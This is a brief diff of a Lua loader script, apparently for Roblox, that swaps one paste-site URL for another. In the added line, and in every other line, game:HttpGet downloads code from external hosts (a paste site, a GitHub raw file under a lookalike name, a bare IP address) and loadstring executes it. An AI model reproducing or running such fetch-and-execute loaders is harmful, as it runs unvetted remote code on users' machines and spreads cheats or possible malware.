@@ -2,4 +2,4 @@
 -- RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/release/refs/heads/main/main.lua"));
 -- loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
 
-loadstring(game:HttpGet("https://pastefy.app/ORaRiRPF/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/X0ui9aSx/raw"))()
